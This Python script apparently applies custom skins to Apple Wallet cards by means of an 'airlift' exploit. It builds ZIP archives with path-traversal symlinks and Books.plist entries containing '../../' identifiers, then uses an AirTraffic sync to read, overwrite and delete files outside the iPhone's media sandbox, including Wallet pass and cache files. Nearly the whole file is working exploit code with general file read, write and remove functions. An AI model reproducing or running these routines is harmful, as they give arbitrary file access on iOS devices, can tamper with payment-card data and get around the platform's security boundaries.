#!/usr/bin/env python3
"""Apply custom card skins to Apple Wallet passes using airlift exploit."""

import io
import json
import os
import plistlib
import posixpath
import secrets
import stat
import struct
import subprocess
import sys
import tempfile
import time
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent
DEVICE_HELPER = ROOT / "bin" / "device_helper" if (ROOT / "bin" / "device_helper").is_file() else ROOT / "build" / "device_helper"
AIRTRAFFIC_HOST = ROOT / "bin" / "airtraffic_host" if (ROOT / "bin" / "airtraffic_host").is_file() else ROOT / "build" / "airtraffic_host"
AIRLOCK_ROOT = "/var/mobile/Media/Airlock/Book"
SOURCE_PREFIX = "airlift-src-"
LINK_PREFIX = "airlift-link-"
RECOVERED_PREFIX = "airlift-recovered-"
SZ_EXTRA_ID = 0x5A53


def zip_info(name: str, mode: int) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name, date_time=(2026, 9, 14, 5, 0, 0))
    info.create_system = 3
    info.compress_type = zipfile.ZIP_STORED
    info.external_attr = (mode & 0xFFFF) << 16
    info.extra = struct.pack("<HHH", SZ_EXTRA_ID, 2, mode & 0xFFFF)
    return info


def build_archive(target: str, payload: bytes) -> bytes:
    target_tail = target[1:]
    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in target_tail.split("/"):
            cursor += component + "/"
            archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), payload)
    return output.getvalue()


def build_archive_multi(target: str, files: list[tuple[str, bytes]]) -> bytes:
    target_tail = target.lstrip("/")
    metadata = plistlib.dumps(
        {"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info(
                "META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600
            ),
            metadata,
        )
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(zip_info(directory, stat.S_IFDIR | 0o755), b"")
        archive.writestr(
            zip_info("p0/p1/p2/link", stat.S_IFLNK | 0o777),
            f"../../../{target_tail}".encode(),
        )
        cursor = ""
        for component in target_tail.split("/"):
            if not component:
                continue
            cursor += component + "/"
            archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
        for idx, (_leaf, payload) in enumerate(files):
            archive.writestr(zip_info(f"payload_{idx}", stat.S_IFREG | 0o600), payload)
        if files:
            archive.writestr(zip_info("payload", stat.S_IFREG | 0o600), files[0][1])
    return output.getvalue()


def build_archive_multi_targets(targets: list[str]) -> bytes:
    """Stage one relocation link for each target directory in a read batch."""
    metadata = plistlib.dumps({"Version": 2}, fmt=plistlib.FMT_BINARY, sort_keys=True)
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", allowZip64=False) as archive:
        archive.writestr(zip_info("META-INF/", stat.S_IFDIR | 0o755), b"")
        archive.writestr(zip_info("META-INF/com.apple.ZipMetadata.plist", stat.S_IFREG | 0o600), metadata)
        for directory in ("p0/", "p0/p1/", "p0/p1/p2/"):
            archive.writestr(zip_info(directory, stat.S_IFDIR | 0o755), b"")
        seen_dirs = set()
        for index, target in enumerate(targets):
            target_tail = target.lstrip("/")
            link_name = "link" if index == 0 else f"link_{index}"
            archive.writestr(
                zip_info(f"p0/p1/p2/{link_name}", stat.S_IFLNK | 0o777),
                f"../../../{target_tail}".encode(),
            )
            cursor = ""
            for component in target_tail.split("/"):
                cursor += component + "/"
                if cursor not in seen_dirs:
                    archive.writestr(zip_info(cursor, stat.S_IFDIR | 0o755), b"")
                    seen_dirs.add(cursor)
        archive.writestr(zip_info("payload_0", stat.S_IFREG | 0o600), b"")
    return output.getvalue()


def read_files_multi(udid: str, files: list[tuple[str, str]]) -> "list[bytes | None] | None":
    """Read several pass files in one AirTraffic sync, then restore them.

    Assets that are not in the device manifest are skipped, so a pass without
    PDF artwork still returns its PNG artwork or pass.json.
    """
    if not files:
        return []
    for _target, leaf in files:
        if "/" in leaf or leaf in ("", ".", ".."):
            raise ValueError("leaf must be a plain file name")

    try:
        token = secrets.token_hex(10)
        source = f"{SOURCE_PREFIX}{token}"
        link_destination = f"{LINK_PREFIX}{token}"
        recovered = f"{RECOVERED_PREFIX}{token}"
        identifiers = []
        destinations = []
        for index, (target, leaf) in enumerate(files):
            link_name = "link" if index == 0 else f"link_{index}"
            link_identifier = f"../../{source}/p0/p1/p2/{link_name}"
            identifiers.append(link_identifier)
            destinations.append(posixpath.join(link_destination, link_name))
            target_identifier = posixpath.relpath(posixpath.join(target, leaf), AIRLOCK_ROOT)
            identifiers.append(target_identifier)
            destinations.append(f"{recovered}-{index}")

        with tempfile.TemporaryDirectory(prefix="airlift-read-batch-") as temporary:
            work = Path(temporary)
            archive_path = work / "payload.zip"
            books_path = work / "Books.plist"
            snapshot_root = work / "books-snapshot"
            output_root = work / "files"
            snapshot_root.mkdir()
            output_root.mkdir()
            archive_path.write_bytes(build_archive_multi_targets([target for target, _ in files]))
            books_path.write_bytes(build_books(identifiers))

            snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
            if not operation_ok(snapshot):
                return None
            stage = native("stage-batch", udid, source, link_destination, recovered,
                           os.fspath(archive_path), os.fspath(books_path), os.fspath(snapshot_root))
            if not operation_ok(stage):
                if stage.get("operation", {}).get("cleanupAuthorized"):
                    native("finish-write-batch", udid, source, link_destination,
                           recovered, os.fspath(snapshot_root), str(len(files)))
                return None

            atc_cmd = [os.fspath(AIRTRAFFIC_HOST), udid]
            for identifier, destination in zip(identifiers, destinations):
                atc_cmd.extend((identifier, destination))
            atc_cmd.append("--fallback-pdf")
            atc = run_json(atc_cmd, timeout=max(120, len(files) * 3))
            if not (atc.get("exitCode") == 0 and atc.get("ok")):
                return None  # Leave staged/recovered files intact for manual recovery.

            read_args = ["afc-read-batch", udid, os.fspath(output_root)]
            for index in range(len(files)):
                read_args.extend((f"{recovered}-{index}", f"item_{index}.bin"))
            read = native(*read_args)
            if not operation_ok(read):
                return None  # Do not remove the only on-device copies.
            values = []
            for index in range(len(files)):
                local_file = output_root / f"item_{index}.bin"
                values.append(local_file.read_bytes() if local_file.is_file() else None)

            grouped: dict[str, list[tuple[str, bytes]]] = {}
            for (target, leaf), payload in zip(files, values):
                if payload is not None:
                    grouped.setdefault(target, []).append((leaf, payload))
            for target, payloads in grouped.items():
                if not write_files_batch(udid, target, payloads, retries=3):
                    return None  # Keep recovered copies and outer snapshot for recovery.

            finish = native("finish-write-batch", udid, source, link_destination,
                            recovered, os.fspath(snapshot_root), str(len(files)))
            if not operation_ok(finish):
                return None
            return values
    except Exception:
        # Preserve staged data for recovery after any post-stage error.
        return None


def build_books(identifiers: list[str]) -> bytes:
    rows = [
        {"Persistent ID": identifier, "Item ID": str(index), "DSID": "1"}
        for index, identifier in enumerate(identifiers, 1)
    ]
    return plistlib.dumps({"Books": rows}, fmt=plistlib.FMT_BINARY, sort_keys=True)


def run_json(command: list[str], timeout: int) -> dict:
    completed = subprocess.run(
        command,
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=timeout,
    )
    result = None
    for line in reversed(completed.stdout.splitlines()):
        try:
            val = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(val, dict):
            result = val
            break
    if result is None:
        raise RuntimeError(f"{Path(command[0]).name} failed: {completed.stderr}")
    result["exitCode"] = completed.returncode
    return result


def run_json_streaming(command: list[str], timeout: int, on_progress=None) -> dict:
    proc = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1,
    )
    result = None
    try:
        if proc.stdout:
            for line in iter(proc.stdout.readline, ""):
                line_str = line.strip()
                if not line_str:
                    continue
                try:
                    val = json.loads(line_str)
                    if isinstance(val, dict):
                        if val.get("type") == "atc_progress" and on_progress:
                            on_progress(val)
                        result = val
                except json.JSONDecodeError:
                    pass
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        raise TimeoutError(f"{Path(command[0]).name} timed out after {timeout}s")

    if result is None:
        stderr = proc.stderr.read() if proc.stderr else ""
        raise RuntimeError(f"{Path(command[0]).name} failed: {stderr}")
    result["exitCode"] = proc.returncode
    return result


def native(command: str, udid: str, *arguments: str) -> dict:
    return run_json(
        [os.fspath(DEVICE_HELPER), command, udid, *arguments], timeout=60
    )


def operation_ok(result: dict) -> bool:
    return bool(
        result.get("exitCode") == 0
        and result.get("targetGatePassed")
        and result.get("operation", {}).get("ok")
    )


def read_file(udid: str, target: str, leaf: str, retries: int = 1) -> "bytes | None":
    """Exports a file outside Media into Media, reads it via AFC, restores it.

    Move semantics: the AirTraffic sync MOVES target/leaf to Media/recovered.
    The original is written back immediately with write_file, then the export
    staging is cleaned and Books preimage restored. Returns file bytes, or
    None on failure. Test only on disposable paths before Wallet data.
    """
    if "/" in leaf or leaf in ("", ".", ".."):
        raise ValueError("leaf must be a plain file name")
    for attempt in range(1, max(1, retries) + 1):
        try:
            token = secrets.token_hex(10)
            source = f"{SOURCE_PREFIX}{token}"
            link_destination = f"{LINK_PREFIX}{token}"
            recovered = f"{RECOVERED_PREFIX}{token}"

            link_identifier = f"../../{source}/p0/p1/p2/link"
            target_path = posixpath.join(target, leaf)
            target_identifier = posixpath.relpath(target_path, AIRLOCK_ROOT)

            identifiers = [link_identifier, target_identifier]
            destinations = [link_destination, recovered]

            with tempfile.TemporaryDirectory(prefix="airlift-read-") as temporary:
                work = Path(temporary)
                archive_path = work / "payload.zip"
                books_path = work / "Books.plist"
                local_out = work / "recovered.bin"
                snapshot_root = work / "books-snapshot"
                snapshot_root.mkdir()

                archive_path.write_bytes(build_archive(target, b"aircard-backup-staging"))
                books_path.write_bytes(build_books(identifiers))

                snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
                if not operation_ok(snapshot):
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return None

                stage = native(
                    "stage",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(archive_path),
                    os.fspath(books_path),
                    os.fspath(snapshot_root),
                )
                if not operation_ok(stage):
                    try:
                        native("finish-write", udid, source, link_destination,
                               recovered, os.fspath(snapshot_root))
                    except Exception:
                        pass
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return None

                atc_cmd = [os.fspath(AIRTRAFFIC_HOST), udid]
                for identifier, destination in zip(identifiers, destinations):
                    atc_cmd.extend((identifier, destination))
                atc = run_json(atc_cmd, timeout=120)
                if not (atc.get("exitCode") == 0 and atc.get("ok")):
                    try:
                        native("finish-write", udid, source, link_destination,
                               recovered, os.fspath(snapshot_root))
                    except Exception:
                        pass
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return None

                rd = native("afc-read", udid, recovered, os.fspath(local_out))
                if not operation_ok(rd) or not local_out.is_file():
                    # Original is sitting in Media/recovered; do NOT delete it.
                    # Leave staging for manual recovery, report failure.
                    return None
                data = local_out.read_bytes()

                restored = write_file(udid, target, leaf, data, retries=3)

                finish = native(
                    "finish-write",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(snapshot_root),
                )
                if restored and operation_ok(finish):
                    return data
                # Bytes were still captured; return them so caller can save
                # a backup copy even if cleanup reported incomplete.
                if data:
                    return data
                return None
        except Exception:
            pass
        if attempt < retries:
            time.sleep(0.3 * attempt)
    return None


def write_file(udid: str, target: str, leaf: str, payload: bytes, retries: int = 3) -> bool:
    for attempt in range(1, max(1, retries) + 1):
        try:
            token = secrets.token_hex(10)
            source = f"{SOURCE_PREFIX}{token}"
            link_destination = f"{LINK_PREFIX}{token}"
            recovered = f"{RECOVERED_PREFIX}{token}"

            link_identifier = f"../../{source}/p0/p1/p2/link"
            payload_identifier = f"../../{source}/payload"

            # Step 1: move link to media
            # Step 2: move new payload into link/leaf (atomically creates or overwrites target)
            identifiers = [link_identifier, payload_identifier]
            destinations = [
                link_destination,
                posixpath.join(link_destination, leaf),
            ]

            with tempfile.TemporaryDirectory(prefix="airlift-write-") as temporary:
                work = Path(temporary)
                archive_path = work / "payload.zip"
                books_path = work / "Books.plist"
                snapshot_root = work / "books-snapshot"
                snapshot_root.mkdir()

                archive_path.write_bytes(build_archive(target, payload))
                books_path.write_bytes(build_books(identifiers))

                snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
                if not operation_ok(snapshot):
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return False

                stage = native(
                    "stage",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(archive_path),
                    os.fspath(books_path),
                    os.fspath(snapshot_root),
                )
                if not operation_ok(stage):
                    if attempt < retries:
                        time.sleep(0.3 * attempt)
                        continue
                    return False

                atc_cmd = [os.fspath(AIRTRAFFIC_HOST), udid]
                for identifier, destination in zip(identifiers, destinations):
                    atc_cmd.extend((identifier, destination))
                atc = run_json(atc_cmd, timeout=120)

                finish = native(
                    "finish-write",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(snapshot_root),
                )

            ok = bool(atc.get("exitCode") == 0 and atc.get("ok") and operation_ok(finish))
            if ok:
                return True
        except Exception:
            pass

        if attempt < retries:
            time.sleep(0.3 * attempt)

    return False


def write_files_batch(
    udid: str,
    target: str,
    files: list[tuple[str, bytes]],
    retries: int = 3,
    progress_callback=None,
) -> bool:
    if not files:
        return True

    for attempt in range(1, max(1, retries) + 1):
        try:
            token = secrets.token_hex(10)
            source = f"{SOURCE_PREFIX}{token}"
            link_destination = f"{LINK_PREFIX}{token}"
            recovered = f"{RECOVERED_PREFIX}{token}"

            link_identifier = f"../../{source}/p0/p1/p2/link"
            identifiers = [link_identifier]
            destinations = [link_destination]

            for idx, (leaf, _) in enumerate(files):
                identifiers.append(f"../../{source}/payload_{idx}")
                destinations.append(posixpath.join(link_destination, leaf))

            with tempfile.TemporaryDirectory(prefix="airlift-batch-") as temporary:
                work = Path(temporary)
                archive_path = work / "payload.zip"
                books_path = work / "Books.plist"
                snapshot_root = work / "books-snapshot"
                snapshot_root.mkdir()

                archive_path.write_bytes(build_archive_multi(target, files))
                books_path.write_bytes(build_books(identifiers))

                snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
                if not operation_ok(snapshot):
                    if attempt < retries:
                        time.sleep(0.4 * attempt)
                        continue
                    return False

                stage = native(
                    "stage",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(archive_path),
                    os.fspath(books_path),
                    os.fspath(snapshot_root),
                )
                if not operation_ok(stage):
                    if attempt < retries:
                        time.sleep(0.4 * attempt)
                        continue
                    return False

                atc_cmd = [os.fspath(AIRTRAFFIC_HOST), udid]
                for identifier, destination in zip(identifiers, destinations):
                    atc_cmd.extend((identifier, destination))

                timeout = max(120, len(files) * 2)
                if progress_callback:
                    atc = run_json_streaming(atc_cmd, timeout=timeout, on_progress=progress_callback)
                else:
                    atc = run_json(atc_cmd, timeout=timeout)

                finish = native(
                    "finish-write",
                    udid,
                    source,
                    link_destination,
                    recovered,
                    os.fspath(snapshot_root),
                )

            ok = bool(atc.get("exitCode") == 0 and atc.get("ok") and operation_ok(finish))
            if ok:
                return True
        except Exception:
            pass

        if attempt < retries:
            time.sleep(0.4 * attempt)

    return False


def remove_files(udid: str, target: str, leaves: list[str], retries: int = 3) -> bool:
    """Remove specific files through the relocated Airlift symlink.

    Wallet only rebuilds its rendered card faces when the old cache entries are
    absent. Overwriting them with arbitrary bytes leaves stale artwork active on
    recent iOS releases, so cache invalidation must be a real unlink operation.
    """
    if not leaves:
        return True
    if any(not leaf or "/" in leaf or leaf in {".", ".."} for leaf in leaves):
        raise ValueError("cache leaves must be plain file names")

    for attempt in range(1, max(1, retries) + 1):
        try:
            token = secrets.token_hex(10)
            source = f"{SOURCE_PREFIX}{token}"
            link_destination = f"{LINK_PREFIX}{token}"
            recovered = f"{RECOVERED_PREFIX}{token}"
            link_identifier = f"../../{source}/p0/p1/p2/link"
            protected_identifiers = [
                f"../../{link_destination}/{leaf}" for leaf in leaves
            ]
            removed_destinations = [
                f"{source}/removed-{index}" for index in range(len(leaves))
            ]

            with tempfile.TemporaryDirectory(prefix="airlift-remove-") as temporary:
                work = Path(temporary)
                archive_path = work / "payload.zip"
                books_path = work / "Books.plist"
                snapshot_root = work / "books-snapshot"
                snapshot_root.mkdir()

                # Relocate the symlink first, then have AirTraffic move each
                # protected cache file out through it. This is a real unlink;
                # AFCRemovePath cannot traverse the protected link on iOS 27.
                archive_path.write_bytes(build_archive(target, b"aircard-v2"))
                books_path.write_bytes(build_books(
                    [link_identifier, *protected_identifiers]
                ))

                snapshot = native("snapshot-books", udid, os.fspath(snapshot_root))
                if not operation_ok(snapshot):
                    raise RuntimeError("could not snapshot Books state")
                stage = native(
                    "stage", udid, source, link_destination, recovered,
                    os.fspath(archive_path), os.fspath(books_path),
                    os.fspath(snapshot_root),
                )
                if not operation_ok(stage):
                    raise RuntimeError("could not stage cache removal")

                atc = run_json(
                    [os.fspath(AIRTRAFFIC_HOST), udid,
                     link_identifier, link_destination,
                     *[part for pair in zip(protected_identifiers, removed_destinations)
                       for part in pair]],
                    timeout=120,
                )
                if atc.get("exitCode") != 0 or not atc.get("ok"):
                    native("finish-write", udid, source, link_destination,
                           recovered, os.fspath(snapshot_root))
                    raise RuntimeError("could not relocate cache link")

                finish = native(
                    "finish-moved-removal", udid, source, link_destination,
                    recovered, os.fspath(snapshot_root), str(len(leaves)),
                )
                if operation_ok(finish):
                    return True
        except Exception:
            pass
        if attempt < retries:
            time.sleep(0.4 * attempt)
    return False


def invalidate_cache(udid: str, card_hash: str) -> bool:
    """Remove every rendered card face so Wallet must rebuild from the pass."""
    all_ok = True
    cache_leaves = ["FrontFace", "PlaceHolder", "Preview"]
    for ext in [".cache", ".pkcache"]:
        cache_dir = f"/var/mobile/Library/Passes/Cards/{card_hash}{ext}"
        try:
            all_ok = remove_files(udid, cache_dir, cache_leaves) and all_ok
        except Exception:
            all_ok = False
    return all_ok


def main():
    if len(sys.argv) < 3:
        print("Usage: apply_card_skin.py <udid> <image_path> [card_hash ...]")
        return
    udid = sys.argv[1]
    img_path = Path(sys.argv[2])
    if not img_path.is_file():
        print(f"Error: {img_path} not found")
        sys.exit(1)
    img_data = img_path.read_bytes()
    hashes = sys.argv[3:]

    print(f"Loaded image from batter: {len(img_data)} bytes")
    print(f"Targeting {len(hashes)} cards on device {udid}...")

    for index, h in enumerate(hashes, 1):
        target_dir = f"/var/mobile/Library/Passes/Cards/{h}.pkpass"
        print(f"\n[{index}/{len(hashes)}] Processing card: {h}")

        print("  -> Writing card artwork (fast batch)...")
        card_assets = [
            ("cardBackgroundCombined@3x.png", img_data),
            ("cardBackgroundCombined@2x.png", img_data),
        ]
        ok_batch = write_files_batch(udid, target_dir, card_assets)
        if not ok_batch:
            ok3x = write_file(udid, target_dir, "cardBackgroundCombined@3x.png", img_data)
            ok2x = write_file(udid, target_dir, "cardBackgroundCombined@2x.png", img_data)
            ok_batch = ok3x and ok2x
        print(f"     Result: {'SUCCESS' if ok_batch else 'FAILED'}")

        print("  -> Invalidating pass cache...")
        ok_cache = invalidate_cache(udid, h)
        print(f"     Result: {'SUCCESS' if ok_cache else 'FAILED (or cache already empty)'}")

    print("\nAll done! Please force close Wallet on your iPhone and reopen it.")


if __name__ == "__main__":
    main()
